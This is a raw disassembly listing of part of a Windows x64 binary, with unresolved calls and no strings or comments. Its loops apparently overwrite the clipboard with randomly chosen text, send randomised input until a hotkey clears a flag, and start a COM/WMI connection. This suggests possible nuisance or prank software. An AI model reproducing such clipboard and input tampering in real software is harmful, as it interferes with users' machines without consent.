   140001e3f:	cc                   	int3
   140001e40:	48 83 ec 28          	sub    $0x28,%rsp
   140001e44:	81 fa 12 03 00 00    	cmp    $0x312,%edx
   140001e4a:	75 1c                	jne    0x140001e68
   140001e4c:	49 83 f8 01          	cmp    $0x1,%r8
   140001e50:	75 16                	jne    0x140001e68
   140001e52:	33 c9                	xor    %ecx,%ecx
   140001e54:	c6 05 59 b2 00 00 00 	movb   $0x0,0xb259(%rip)        # 0x14000d0b4
   140001e5b:	ff 15 ef 64 00 00    	call   *0x64ef(%rip)        # 0x140008350
   140001e61:	33 c0                	xor    %eax,%eax
   140001e63:	48 83 c4 28          	add    $0x28,%rsp
   140001e67:	c3                   	ret
   140001e68:	48 83 c4 28          	add    $0x28,%rsp
   140001e6c:	48 ff 25 65 64 00 00 	rex.W jmp *0x6465(%rip)        # 0x1400082d8
   140001e73:	cc                   	int3
   140001e74:	cc                   	int3
   140001e75:	cc                   	int3
   140001e76:	cc                   	int3
   140001e77:	cc                   	int3
   140001e78:	cc                   	int3
   140001e79:	cc                   	int3
   140001e7a:	cc                   	int3
   140001e7b:	cc                   	int3
   140001e7c:	cc                   	int3
   140001e7d:	cc                   	int3
   140001e7e:	cc                   	int3
   140001e7f:	cc                   	int3
   140001e80:	48 83 ec 38          	sub    $0x38,%rsp
   140001e84:	80 3d 29 b2 00 00 00 	cmpb   $0x0,0xb229(%rip)        # 0x14000d0b4
   140001e8b:	0f 84 d1 00 00 00    	je     0x140001f62
   140001e91:	48 89 5c 24 30       	mov    %rbx,0x30(%rsp)
   140001e96:	48 bb ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rbx
   140001e9d:	ff ff 7f 
   140001ea0:	48 89 74 24 28       	mov    %rsi,0x28(%rsp)
   140001ea5:	48 be ff a1 2f 4d ff 	movabs $0x7fffffff4d2fa1ff,%rsi
   140001eac:	ff ff 7f 
   140001eaf:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   140001eb4:	bf 00 5e d0 b2       	mov    $0xb2d05e00,%edi
   140001eb9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140001ec0:	45 33 c9             	xor    %r9d,%r9d
   140001ec3:	48 8d 0d 96 6b 00 00 	lea    0x6b96(%rip),%rcx        # 0x140008a60
   140001eca:	45 33 c0             	xor    %r8d,%r8d
   140001ecd:	33 d2                	xor    %edx,%edx
   140001ecf:	ff 15 3b 65 00 00    	call   *0x653b(%rip)        # 0x140008410
   140001ed5:	48 8d 4c 24 48       	lea    0x48(%rsp),%rcx
   140001eda:	e8 41 f1 ff ff       	call   0x140001020
   140001edf:	48 8b 44 24 48       	mov    0x48(%rsp),%rax
   140001ee4:	48 3b c6             	cmp    %rsi,%rax
   140001ee7:	7d 0b                	jge    0x140001ef4
   140001ee9:	48 8d 0c 38          	lea    (%rax,%rdi,1),%rcx
   140001eed:	48 89 4c 24 40       	mov    %rcx,0x40(%rsp)
   140001ef2:	eb 05                	jmp    0x140001ef9
   140001ef4:	48 89 5c 24 40       	mov    %rbx,0x40(%rsp)
   140001ef9:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140001efe:	e8 fd 3d 00 00       	call   0x140005d00
   140001f03:	45 33 c9             	xor    %r9d,%r9d
   140001f06:	48 8d 0d 83 6b 00 00 	lea    0x6b83(%rip),%rcx        # 0x140008a90
   140001f0d:	45 33 c0             	xor    %r8d,%r8d
   140001f10:	33 d2                	xor    %edx,%edx
   140001f12:	ff 15 f8 64 00 00    	call   *0x64f8(%rip)        # 0x140008410
   140001f18:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   140001f1d:	e8 fe f0 ff ff       	call   0x140001020
   140001f22:	48 8b 44 24 50       	mov    0x50(%rsp),%rax
   140001f27:	48 3b c6             	cmp    %rsi,%rax
   140001f2a:	7d 0b                	jge    0x140001f37
   140001f2c:	48 8d 0c 38          	lea    (%rax,%rdi,1),%rcx
   140001f30:	48 89 4c 24 40       	mov    %rcx,0x40(%rsp)
   140001f35:	eb 05                	jmp    0x140001f3c
   140001f37:	48 89 5c 24 40       	mov    %rbx,0x40(%rsp)
   140001f3c:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140001f41:	e8 ba 3d 00 00       	call   0x140005d00
   140001f46:	80 3d 67 b1 00 00 00 	cmpb   $0x0,0xb167(%rip)        # 0x14000d0b4
   140001f4d:	0f 85 6d ff ff ff    	jne    0x140001ec0
   140001f53:	48 8b 7c 24 20       	mov    0x20(%rsp),%rdi
   140001f58:	48 8b 74 24 28       	mov    0x28(%rsp),%rsi
   140001f5d:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140001f62:	48 83 c4 38          	add    $0x38,%rsp
   140001f66:	c3                   	ret
   140001f67:	cc                   	int3
   140001f68:	cc                   	int3
   140001f69:	cc                   	int3
   140001f6a:	cc                   	int3
   140001f6b:	cc                   	int3
   140001f6c:	cc                   	int3
   140001f6d:	cc                   	int3
   140001f6e:	cc                   	int3
   140001f6f:	cc                   	int3
   140001f70:	40 53                	rex push %rbx
   140001f72:	56                   	push   %rsi
   140001f73:	57                   	push   %rdi
   140001f74:	48 83 ec 50          	sub    $0x50,%rsp
   140001f78:	33 d2                	xor    %edx,%edx
   140001f7a:	48 8d 0d 9f 69 00 00 	lea    0x699f(%rip),%rcx        # 0x140008920
   140001f81:	ff 15 e1 63 00 00    	call   *0x63e1(%rip)        # 0x140008368
   140001f87:	33 c9                	xor    %ecx,%ecx
   140001f89:	48 8b d8             	mov    %rax,%rbx
   140001f8c:	ff 15 96 63 00 00    	call   *0x6396(%rip)        # 0x140008328
   140001f92:	b9 01 00 00 00       	mov    $0x1,%ecx
   140001f97:	8b f8                	mov    %eax,%edi
   140001f99:	ff 15 89 63 00 00    	call   *0x6389(%rip)        # 0x140008328
   140001f9f:	80 3d 0e b1 00 00 00 	cmpb   $0x0,0xb10e(%rip)        # 0x14000d0b4
   140001fa6:	8b f0                	mov    %eax,%esi
   140001fa8:	0f 84 07 01 00 00    	je     0x1400020b5
   140001fae:	48 89 ac 24 80 00 00 	mov    %rbp,0x80(%rsp)
   140001fb5:	00 
   140001fb6:	48 bd ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rbp
   140001fbd:	ff ff 7f 
   140001fc0:	4c 89 74 24 48       	mov    %r14,0x48(%rsp)
   140001fc5:	49 be ff 79 c4 5e fe 	movabs $0x7ffffffe5ec479ff,%r14
   140001fcc:	ff ff 7f 
   140001fcf:	4c 89 7c 24 40       	mov    %r15,0x40(%rsp)
   140001fd4:	49 bf 00 86 3b a1 01 	movabs $0x1a13b8600,%r15
   140001fdb:	00 00 00 
   140001fde:	66 90                	xchg   %ax,%ax
   140001fe0:	ff 15 da 65 00 00    	call   *0x65da(%rip)        # 0x1400085c0
   140001fe6:	25 03 00 00 80       	and    $0x80000003,%eax
   140001feb:	7d 07                	jge    0x140001ff4
   140001fed:	ff c8                	dec    %eax
   140001fef:	83 c8 fc             	or     $0xfffffffc,%eax
   140001ff2:	ff c0                	inc    %eax
   140001ff4:	85 c0                	test   %eax,%eax
   140001ff6:	74 4a                	je     0x140002042
   140001ff8:	83 e8 01             	sub    $0x1,%eax
   140001ffb:	74 40                	je     0x14000203d
   140001ffd:	83 e8 01             	sub    $0x1,%eax
   140002000:	74 22                	je     0x140002024
   140002002:	83 f8 01             	cmp    $0x1,%eax
   140002005:	75 61                	jne    0x140002068
   140002007:	c7 44 24 30 04 00 00 	movl   $0x4,0x30(%rsp)
   14000200e:	00 
   14000200f:	44 8d 47 d8          	lea    -0x28(%rdi),%r8d
   140002013:	89 74 24 28          	mov    %esi,0x28(%rsp)
   140002017:	45 33 c9             	xor    %r9d,%r9d
   14000201a:	c7 44 24 20 28 00 00 	movl   $0x28,0x20(%rsp)
   140002021:	00 
   140002022:	eb 39                	jmp    0x14000205d
   140002024:	c7 44 24 30 04 00 00 	movl   $0x4,0x30(%rsp)
   14000202b:	00 
   14000202c:	45 33 c9             	xor    %r9d,%r9d
   14000202f:	89 74 24 28          	mov    %esi,0x28(%rsp)
   140002033:	c7 44 24 20 28 00 00 	movl   $0x28,0x20(%rsp)
   14000203a:	00 
   14000203b:	eb 1d                	jmp    0x14000205a
   14000203d:	45 33 c9             	xor    %r9d,%r9d
   140002040:	eb 04                	jmp    0x140002046
   140002042:	44 8d 4e d8          	lea    -0x28(%rsi),%r9d
   140002046:	c7 44 24 30 04 00 00 	movl   $0x4,0x30(%rsp)
   14000204d:	00 
   14000204e:	c7 44 24 28 28 00 00 	movl   $0x28,0x28(%rsp)
   140002055:	00 
   140002056:	89 7c 24 20          	mov    %edi,0x20(%rsp)
   14000205a:	45 33 c0             	xor    %r8d,%r8d
   14000205d:	33 d2                	xor    %edx,%edx
   14000205f:	48 8b cb             	mov    %rbx,%rcx
   140002062:	ff 15 a8 62 00 00    	call   *0x62a8(%rip)        # 0x140008310
   140002068:	48 8d 4c 24 78       	lea    0x78(%rsp),%rcx
   14000206d:	e8 ae ef ff ff       	call   0x140001020
   140002072:	48 8b 44 24 78       	mov    0x78(%rsp),%rax
   140002077:	49 3b c6             	cmp    %r14,%rax
   14000207a:	7d 0b                	jge    0x140002087
   14000207c:	4a 8d 0c 38          	lea    (%rax,%r15,1),%rcx
   140002080:	48 89 4c 24 70       	mov    %rcx,0x70(%rsp)
   140002085:	eb 05                	jmp    0x14000208c
   140002087:	48 89 6c 24 70       	mov    %rbp,0x70(%rsp)
   14000208c:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   140002091:	e8 6a 3c 00 00       	call   0x140005d00
   140002096:	80 3d 17 b0 00 00 00 	cmpb   $0x0,0xb017(%rip)        # 0x14000d0b4
   14000209d:	0f 85 3d ff ff ff    	jne    0x140001fe0
   1400020a3:	4c 8b 7c 24 40       	mov    0x40(%rsp),%r15
   1400020a8:	4c 8b 74 24 48       	mov    0x48(%rsp),%r14
   1400020ad:	48 8b ac 24 80 00 00 	mov    0x80(%rsp),%rbp
   1400020b4:	00 
   1400020b5:	48 83 c4 50          	add    $0x50,%rsp
   1400020b9:	5f                   	pop    %rdi
   1400020ba:	5e                   	pop    %rsi
   1400020bb:	5b                   	pop    %rbx
   1400020bc:	c3                   	ret
   1400020bd:	cc                   	int3
   1400020be:	cc                   	int3
   1400020bf:	cc                   	int3
   1400020c0:	40 53                	rex push %rbx
   1400020c2:	48 81 ec 30 01 00 00 	sub    $0x130,%rsp
   1400020c9:	48 8b 05 70 af 00 00 	mov    0xaf70(%rip),%rax        # 0x14000d040
   1400020d0:	48 33 c4             	xor    %rsp,%rax
   1400020d3:	48 89 84 24 20 01 00 	mov    %rax,0x120(%rsp)
   1400020da:	00 
   1400020db:	bb dc 00 00 00       	mov    $0xdc,%ebx
   1400020e0:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   1400020e5:	44 8b c3             	mov    %ebx,%r8d
   1400020e8:	33 d2                	xor    %edx,%edx
   1400020ea:	e8 e3 55 00 00       	call   0x1400076d2
   1400020ef:	80 3d be af 00 00 00 	cmpb   $0x0,0xafbe(%rip)        # 0x14000d0b4
   1400020f6:	66 0f 6f 05 52 6d 00 	movdqa 0x6d52(%rip),%xmm0        # 0x140008e50
   1400020fd:	00 
   1400020fe:	f3 0f 7f 44 24 30    	movdqu %xmm0,0x30(%rsp)
   140002104:	66 89 9c 24 84 00 00 	mov    %bx,0x84(%rsp)
   14000210b:	00 
   14000210c:	0f 84 bd 00 00 00    	je     0x1400021cf
   140002112:	48 89 b4 24 40 01 00 	mov    %rsi,0x140(%rsp)
   140002119:	00 
   14000211a:	48 bb ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rbx
   140002121:	ff ff 7f 
   140002124:	48 89 bc 24 48 01 00 	mov    %rdi,0x148(%rsp)
   14000212b:	00 
   14000212c:	48 be 00 c8 17 a8 04 	movabs $0x4a817c800,%rsi
   140002133:	00 00 00 
   140002136:	48 bf ff 37 e8 57 fb 	movabs $0x7ffffffb57e837ff,%rdi
   14000213d:	ff ff 7f 
   140002140:	4c 8d 44 24 40       	lea    0x40(%rsp),%r8
   140002145:	ba ff ff ff ff       	mov    $0xffffffff,%edx
   14000214a:	33 c9                	xor    %ecx,%ecx
   14000214c:	ff 15 ae 61 00 00    	call   *0x61ae(%rip)        # 0x140008300
   140002152:	85 c0                	test   %eax,%eax
   140002154:	74 32                	je     0x140002188
   140002156:	ff 15 64 64 00 00    	call   *0x6464(%rip)        # 0x1400085c0
   14000215c:	25 03 00 00 80       	and    $0x80000003,%eax
   140002161:	7d 07                	jge    0x14000216a
   140002163:	ff c8                	dec    %eax
   140002165:	83 c8 fc             	or     $0xfffffffc,%eax
   140002168:	ff c0                	inc    %eax
   14000216a:	48 63 c8             	movslq %eax,%rcx
   14000216d:	ba 01 00 00 40       	mov    $0x40000001,%edx
   140002172:	8b 44 8c 30          	mov    0x30(%rsp,%rcx,4),%eax
   140002176:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   14000217b:	89 84 24 94 00 00 00 	mov    %eax,0x94(%rsp)
   140002182:	ff 15 a8 61 00 00    	call   *0x61a8(%rip)        # 0x140008330
   140002188:	48 8d 4c 24 28       	lea    0x28(%rsp),%rcx
   14000218d:	e8 8e ee ff ff       	call   0x140001020
   140002192:	48 8b 44 24 28       	mov    0x28(%rsp),%rax
   140002197:	48 3b c7             	cmp    %rdi,%rax
   14000219a:	7d 0b                	jge    0x1400021a7
   14000219c:	48 8d 0c 30          	lea    (%rax,%rsi,1),%rcx
   1400021a0:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   1400021a5:	eb 05                	jmp    0x1400021ac
   1400021a7:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   1400021ac:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   1400021b1:	e8 4a 3b 00 00       	call   0x140005d00
   1400021b6:	80 3d f7 ae 00 00 00 	cmpb   $0x0,0xaef7(%rip)        # 0x14000d0b4
   1400021bd:	75 81                	jne    0x140002140
   1400021bf:	48 8b bc 24 48 01 00 	mov    0x148(%rsp),%rdi
   1400021c6:	00 
   1400021c7:	48 8b b4 24 40 01 00 	mov    0x140(%rsp),%rsi
   1400021ce:	00 
   1400021cf:	48 8b 8c 24 20 01 00 	mov    0x120(%rsp),%rcx
   1400021d6:	00 
   1400021d7:	48 33 cc             	xor    %rsp,%rcx
   1400021da:	e8 61 46 00 00       	call   0x140006840
   1400021df:	48 81 c4 30 01 00 00 	add    $0x130,%rsp
   1400021e6:	5b                   	pop    %rbx
   1400021e7:	c3                   	ret
   1400021e8:	cc                   	int3
   1400021e9:	cc                   	int3
   1400021ea:	cc                   	int3
   1400021eb:	cc                   	int3
   1400021ec:	cc                   	int3
   1400021ed:	cc                   	int3
   1400021ee:	cc                   	int3
   1400021ef:	cc                   	int3
   1400021f0:	4c 8b dc             	mov    %rsp,%r11
   1400021f3:	48 83 ec 78          	sub    $0x78,%rsp
   1400021f7:	80 3d b6 ae 00 00 00 	cmpb   $0x0,0xaeb6(%rip)        # 0x14000d0b4
   1400021fe:	48 8d 05 bb 68 00 00 	lea    0x68bb(%rip),%rax        # 0x140008ac0
   140002205:	49 89 43 a8          	mov    %rax,-0x58(%r11)
   140002209:	48 8d 05 c8 68 00 00 	lea    0x68c8(%rip),%rax        # 0x140008ad8
   140002210:	49 89 43 b0          	mov    %rax,-0x50(%r11)
   140002214:	48 8d 05 d5 68 00 00 	lea    0x68d5(%rip),%rax        # 0x140008af0
   14000221b:	49 89 43 b8          	mov    %rax,-0x48(%r11)
   14000221f:	48 8d 05 d2 68 00 00 	lea    0x68d2(%rip),%rax        # 0x140008af8
   140002226:	49 89 43 c0          	mov    %rax,-0x40(%r11)
   14000222a:	48 8d 05 df 68 00 00 	lea    0x68df(%rip),%rax        # 0x140008b10
   140002231:	49 89 43 c8          	mov    %rax,-0x38(%r11)
   140002235:	48 8d 05 e4 68 00 00 	lea    0x68e4(%rip),%rax        # 0x140008b20
   14000223c:	49 89 43 d0          	mov    %rax,-0x30(%r11)
   140002240:	0f 84 76 01 00 00    	je     0x1400023bc
   140002246:	49 89 6b f8          	mov    %rbp,-0x8(%r11)
   14000224a:	48 bd ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rbp
   140002251:	ff ff 7f 
   140002254:	4d 89 73 e0          	mov    %r14,-0x20(%r11)
   140002258:	49 be ff 0d fa d5 fe 	movabs $0x7ffffffed5fa0dff,%r14
   14000225f:	ff ff 7f 
   140002262:	4d 89 7b d8          	mov    %r15,-0x28(%r11)
   140002266:	49 bf 00 f2 05 2a 01 	movabs $0x12a05f200,%r15
   14000226d:	00 00 00 
   140002270:	49 89 5b 18          	mov    %rbx,0x18(%r11)
   140002274:	49 89 73 f0          	mov    %rsi,-0x10(%r11)
   140002278:	49 89 7b e8          	mov    %rdi,-0x18(%r11)
   14000227c:	0f 1f 40 00          	nopl   0x0(%rax)
   140002280:	33 c9                	xor    %ecx,%ecx
   140002282:	ff 15 b0 60 00 00    	call   *0x60b0(%rip)        # 0x140008338
   140002288:	85 c0                	test   %eax,%eax
   14000228a:	0f 84 c1 00 00 00    	je     0x140002351
   140002290:	ff 15 fa 60 00 00    	call   *0x60fa(%rip)        # 0x140008390
   140002296:	ff 15 24 63 00 00    	call   *0x6324(%rip)        # 0x1400085c0
   14000229c:	44 8b c0             	mov    %eax,%r8d
   14000229f:	b8 ab aa aa 2a       	mov    $0x2aaaaaab,%eax
   1400022a4:	41 f7 e8             	imul   %r8d
   1400022a7:	8b ca                	mov    %edx,%ecx
   1400022a9:	c1 e9 1f             	shr    $0x1f,%ecx
   1400022ac:	03 d1                	add    %ecx,%edx
   1400022ae:	8d 0c 52             	lea    (%rdx,%rdx,2),%ecx
   1400022b1:	03 c9                	add    %ecx,%ecx
   1400022b3:	44 2b c1             	sub    %ecx,%r8d
   1400022b6:	49 63 c0             	movslq %r8d,%rax
   1400022b9:	48 8b 4c c4 20       	mov    0x20(%rsp,%rax,8),%rcx
   1400022be:	48 c7 c0 ff ff ff ff 	mov    $0xffffffffffffffff,%rax
   1400022c5:	66 66 66 0f 1f 84 00 	data16 data16 nopw 0x0(%rax,%rax,1)
   1400022cc:	00 00 00 00 
   1400022d0:	66 83 7c 41 02 00    	cmpw   $0x0,0x2(%rcx,%rax,2)
   1400022d6:	48 8d 40 01          	lea    0x1(%rax),%rax
   1400022da:	75 f4                	jne    0x1400022d0
   1400022dc:	48 8d 3c 45 02 00 00 	lea    0x2(,%rax,2),%rdi
   1400022e3:	00 
   1400022e4:	b9 02 00 00 00       	mov    $0x2,%ecx
   1400022e9:	48 8b d7             	mov    %rdi,%rdx
   1400022ec:	ff 15 06 5e 00 00    	call   *0x5e06(%rip)        # 0x1400080f8
   1400022f2:	48 8b f0             	mov    %rax,%rsi
   1400022f5:	ff 15 c5 62 00 00    	call   *0x62c5(%rip)        # 0x1400085c0
   1400022fb:	44 8b c8             	mov    %eax,%r9d
   1400022fe:	b8 ab aa aa 2a       	mov    $0x2aaaaaab,%eax
   140002303:	41 f7 e9             	imul   %r9d
   140002306:	8b ca                	mov    %edx,%ecx
   140002308:	c1 e9 1f             	shr    $0x1f,%ecx
   14000230b:	03 d1                	add    %ecx,%edx
   14000230d:	8d 0c 52             	lea    (%rdx,%rdx,2),%ecx
   140002310:	03 c9                	add    %ecx,%ecx
   140002312:	44 2b c9             	sub    %ecx,%r9d
   140002315:	48 8b ce             	mov    %rsi,%rcx
   140002318:	49 63 c1             	movslq %r9d,%rax
   14000231b:	48 8b 5c c4 20       	mov    0x20(%rsp,%rax,8),%rbx
   140002320:	ff 15 82 5d 00 00    	call   *0x5d82(%rip)        # 0x1400080a8
   140002326:	4c 8b c7             	mov    %rdi,%r8
   140002329:	48 8b d3             	mov    %rbx,%rdx
   14000232c:	48 8b c8             	mov    %rax,%rcx
   14000232f:	e8 c7 54 00 00       	call   0x1400077fb
   140002334:	48 8b ce             	mov    %rsi,%rcx
   140002337:	ff 15 13 5d 00 00    	call   *0x5d13(%rip)        # 0x140008050
   14000233d:	48 8b d6             	mov    %rsi,%rdx
   140002340:	b9 0d 00 00 00       	mov    $0xd,%ecx
   140002345:	ff 15 15 60 00 00    	call   *0x6015(%rip)        # 0x140008360
   14000234b:	ff 15 f7 5f 00 00    	call   *0x5ff7(%rip)        # 0x140008348
   140002351:	48 8d 8c 24 88 00 00 	lea    0x88(%rsp),%rcx
   140002358:	00 
   140002359:	e8 c2 ec ff ff       	call   0x140001020
   14000235e:	48 8b 84 24 88 00 00 	mov    0x88(%rsp),%rax
   140002365:	00 
   140002366:	49 3b c6             	cmp    %r14,%rax
   140002369:	7d 0e                	jge    0x140002379
   14000236b:	4a 8d 0c 38          	lea    (%rax,%r15,1),%rcx
   14000236f:	48 89 8c 24 80 00 00 	mov    %rcx,0x80(%rsp)
   140002376:	00 
   140002377:	eb 08                	jmp    0x140002381
   140002379:	48 89 ac 24 80 00 00 	mov    %rbp,0x80(%rsp)
   140002380:	00 
   140002381:	48 8d 8c 24 80 00 00 	lea    0x80(%rsp),%rcx
   140002388:	00 
   140002389:	e8 72 39 00 00       	call   0x140005d00
   14000238e:	80 3d 1f ad 00 00 00 	cmpb   $0x0,0xad1f(%rip)        # 0x14000d0b4
   140002395:	0f 85 e5 fe ff ff    	jne    0x140002280
   14000239b:	4c 8b 7c 24 50       	mov    0x50(%rsp),%r15
   1400023a0:	4c 8b 74 24 58       	mov    0x58(%rsp),%r14
   1400023a5:	48 8b 7c 24 60       	mov    0x60(%rsp),%rdi
   1400023aa:	48 8b 74 24 68       	mov    0x68(%rsp),%rsi
   1400023af:	48 8b 6c 24 70       	mov    0x70(%rsp),%rbp
   1400023b4:	48 8b 9c 24 90 00 00 	mov    0x90(%rsp),%rbx
   1400023bb:	00 
   1400023bc:	48 83 c4 78          	add    $0x78,%rsp
   1400023c0:	c3                   	ret
   1400023c1:	cc                   	int3
   1400023c2:	cc                   	int3
   1400023c3:	cc                   	int3
   1400023c4:	cc                   	int3
   1400023c5:	cc                   	int3
   1400023c6:	cc                   	int3
   1400023c7:	cc                   	int3
   1400023c8:	cc                   	int3
   1400023c9:	cc                   	int3
   1400023ca:	cc                   	int3
   1400023cb:	cc                   	int3
   1400023cc:	cc                   	int3
   1400023cd:	cc                   	int3
   1400023ce:	cc                   	int3
   1400023cf:	cc                   	int3
   1400023d0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400023d5:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   1400023da:	48 89 7c 24 18       	mov    %rdi,0x18(%rsp)
   1400023df:	4c 89 74 24 20       	mov    %r14,0x20(%rsp)
   1400023e4:	55                   	push   %rbp
   1400023e5:	48 8d ac 24 30 ff ff 	lea    -0xd0(%rsp),%rbp
   1400023ec:	ff 
   1400023ed:	48 81 ec d0 01 00 00 	sub    $0x1d0,%rsp
   1400023f4:	48 8b 05 45 ac 00 00 	mov    0xac45(%rip),%rax        # 0x14000d040
   1400023fb:	48 33 c4             	xor    %rsp,%rax
   1400023fe:	48 89 85 c0 00 00 00 	mov    %rax,0xc0(%rbp)
   140002405:	33 d2                	xor    %edx,%edx
   140002407:	33 c9                	xor    %ecx,%ecx
   140002409:	ff 15 d9 61 00 00    	call   *0x61d9(%rip)        # 0x1400085e8
   14000240f:	85 c0                	test   %eax,%eax
   140002411:	0f 88 0e 03 00 00    	js     0x140002725
   140002417:	45 33 f6             	xor    %r14d,%r14d
   14000241a:	4c 89 74 24 40       	mov    %r14,0x40(%rsp)
   14000241f:	44 89 74 24 38       	mov    %r14d,0x38(%rsp)
   140002424:	4c 89 74 24 30       	mov    %r14,0x30(%rsp)
   140002429:	c7 44 24 28 03 00 00 	movl   $0x3,0x28(%rsp)
   140002430:	00 
   140002431:	c7 44 24 20 06 00 00 	movl   $0x6,0x20(%rsp)
   140002438:	00 
   140002439:	45 33 c9             	xor    %r9d,%r9d
   14000243c:	45 33 c0             	xor    %r8d,%r8d
   14000243f:	bf ff ff ff ff       	mov    $0xffffffff,%edi
   140002444:	8b d7                	mov    %edi,%edx
   140002446:	33 c9                	xor    %ecx,%ecx
   140002448:	ff 15 92 61 00 00    	call   *0x6192(%rip)        # 0x1400085e0
   14000244e:	8b d8                	mov    %eax,%ebx
   140002450:	85 c0                	test   %eax,%eax
   140002452:	0f 88 c5 02 00 00    	js     0x14000271d
   140002458:	4c 89 75 68          	mov    %r14,0x68(%rbp)
   14000245c:	48 8d 45 68          	lea    0x68(%rbp),%rax
   140002460:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140002465:	4c 8d 0d 3c 62 00 00 	lea    0x623c(%rip),%r9        # 0x1400086a8
   14000246c:	33 d2                	xor    %edx,%edx
   14000246e:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   140002474:	48 8d 0d 3d 62 00 00 	lea    0x623d(%rip),%rcx        # 0x1400086b8
   14000247b:	ff 15 57 61 00 00    	call   *0x6157(%rip)        # 0x1400085d8
   140002481:	8b d8                	mov    %eax,%ebx
   140002483:	85 c0                	test   %eax,%eax
   140002485:	0f 88 92 02 00 00    	js     0x14000271d
   14000248b:	48 8d 4d a8          	lea    -0x58(%rbp),%rcx
   14000248f:	ff 15 e3 5d 00 00    	call   *0x5de3(%rip)        # 0x140008278
   140002495:	90                   	nop
   140002496:	0f 10 45 a8          	movups -0x58(%rbp),%xmm0
   14000249a:	0f 11 44 24 70       	movups %xmm0,0x70(%rsp)
   14000249f:	f2 0f 10 45 b8       	movsd  -0x48(%rbp),%xmm0
   1400024a4:	f2 0f 11 44 24 58    	movsd  %xmm0,0x58(%rsp)
   1400024aa:	48 8d 4d 90          	lea    -0x70(%rbp),%rcx
   1400024ae:	ff 15 c4 5d 00 00    	call   *0x5dc4(%rip)        # 0x140008278
   1400024b4:	90                   	nop
   1400024b5:	0f 10 45 90          	movups -0x70(%rbp),%xmm0
   1400024b9:	0f 11 45 c0          	movups %xmm0,-0x40(%rbp)
   1400024bd:	f2 0f 10 45 a0       	movsd  -0x60(%rbp),%xmm0
   1400024c2:	f2 0f 11 44 24 60    	movsd  %xmm0,0x60(%rsp)
   1400024c8:	48 8d 4d 20          	lea    0x20(%rbp),%rcx
   1400024cc:	ff 15 a6 5d 00 00    	call   *0x5da6(%rip)        # 0x140008278
   1400024d2:	90                   	nop
   1400024d3:	0f 10 45 20          	movups 0x20(%rbp),%xmm0
   1400024d7:	0f 11 45 e0          	movups %xmm0,-0x20(%rbp)
   1400024db:	f2 0f 10 45 30       	movsd  0x30(%rbp),%xmm0
   1400024e0:	f2 0f 11 44 24 50    	movsd  %xmm0,0x50(%rsp)
   1400024e6:	48 8d 4d 00          	lea    0x0(%rbp),%rcx
   1400024ea:	ff 15 88 5d 00 00    	call   *0x5d88(%rip)        # 0x140008278
   1400024f0:	90                   	nop
   1400024f1:	0f 10 44 24 70       	movups 0x70(%rsp),%xmm0
   1400024f6:	0f 29 44 24 70       	movaps %xmm0,0x70(%rsp)
   1400024fb:	f2 0f 10 44 24 58    	movsd  0x58(%rsp),%xmm0
   140002501:	f2 0f 11 45 80       	movsd  %xmm0,-0x80(%rbp)
   140002506:	0f 10 45 c0          	movups -0x40(%rbp),%xmm0
   14000250a:	0f 29 45 c0          	movaps %xmm0,-0x40(%rbp)
   14000250e:	f2 0f 10 44 24 60    	movsd  0x60(%rsp),%xmm0
   140002514:	f2 0f 11 45 d0       	movsd  %xmm0,-0x30(%rbp)
   140002519:	0f 10 45 e0          	movups -0x20(%rbp),%xmm0
   14000251d:	0f 29 45 e0          	movaps %xmm0,-0x20(%rbp)
   140002521:	f2 0f 10 44 24 50    	movsd  0x50(%rsp),%xmm0
   140002527:	f2 0f 11 45 f0       	movsd  %xmm0,-0x10(%rbp)
   14000252c:	0f 10 45 00          	movups 0x0(%rbp),%xmm0
   140002530:	0f 29 45 40          	movaps %xmm0,0x40(%rbp)
   140002534:	f2 0f 10 4d 10       	movsd  0x10(%rbp),%xmm1
   140002539:	f2 0f 11 4d 50       	movsd  %xmm1,0x50(%rbp)
   14000253e:	48 8b 4d 68          	mov    0x68(%rbp),%rcx
   140002542:	48 8b 01             	mov    (%rcx),%rax
   140002545:	48 8d 54 24 70       	lea    0x70(%rsp),%rdx
   14000254a:	48 89 54 24 20       	mov    %rdx,0x20(%rsp)
   14000254f:	4c 8d 4d c0          	lea    -0x40(%rbp),%r9
   140002553:	4c 8d 45 e0          	lea    -0x20(%rbp),%r8
   140002557:	48 8d 55 40          	lea    0x40(%rbp),%rdx
   14000255b:	ff 50 50             	call   *0x50(%rax)
   14000255e:	8b d8                	mov    %eax,%ebx
   140002560:	48 8d 4d 00          	lea    0x0(%rbp),%rcx
   140002564:	ff 15 f6 5c 00 00    	call   *0x5cf6(%rip)        # 0x140008260
   14000256a:	90                   	nop
   14000256b:	48 8d 4d 20          	lea    0x20(%rbp),%rcx
   14000256f:	ff 15 eb 5c 00 00    	call   *0x5ceb(%rip)        # 0x140008260
   140002575:	90                   	nop
   140002576:	48 8d 4d 90          	lea    -0x70(%rbp),%rcx
   14000257a:	ff 15 e0 5c 00 00    	call   *0x5ce0(%rip)        # 0x140008260
   140002580:	90                   	nop
   140002581:	48 8d 4d a8          	lea    -0x58(%rbp),%rcx
   140002585:	ff 15 d5 5c 00 00    	call   *0x5cd5(%rip)        # 0x140008260
   14000258b:	85 db                	test   %ebx,%ebx
   14000258d:	0f 88 6b 03 00 00    	js     0x1400028fe
   140002593:	4c 89 75 70          	mov    %r14,0x70(%rbp)
   140002597:	b9 18 00 00 00       	mov    $0x18,%ecx
   14000259c:	e8 c7 42 00 00       	call   0x140006868
   1400025a1:	48 8b d8             	mov    %rax,%rbx
